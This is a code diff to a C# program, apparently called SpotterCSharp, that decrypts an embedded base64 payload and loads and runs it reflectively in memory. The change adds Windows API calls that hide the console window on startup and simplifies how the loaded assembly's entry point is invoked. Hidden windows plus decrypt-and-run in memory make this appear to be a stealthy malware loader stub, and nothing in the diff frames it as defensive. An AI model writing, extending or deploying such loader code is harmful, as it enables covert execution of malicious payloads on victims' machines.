@@ -2,6 +2,7 @@ using System;
 using System.IO;
 using System.Reflection;
 using System.Security.Cryptography;
+using System.Runtime.InteropServices;
 using System.Text;
 
 namespace SpotterCSharp
@@ -10,6 +11,8 @@ namespace SpotterCSharp
     {
         private static void Main(string[] args)
         {
+            var hWindow = GetConsoleWindow();
+            ShowWindow(hWindow, 0);
             string encDllB64 = "ENCRYPTED_BLOB";
             byte[] encDllBytes = Convert.FromBase64String(encDllB64);
             var newIV = new byte[16];
@@ -92,8 +95,13 @@ namespace SpotterCSharp
             var bytes = Convert.FromBase64String(assemblyB64);
             var assembly = Assembly.Load(bytes);
             MethodInfo method = assembly.EntryPoint;
-            object o = assembly.CreateInstance(method.Name);
-            method.Invoke(o, (new object[] { new string[] { } }));
+            method.Invoke(null, null);
         }
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     }
 }
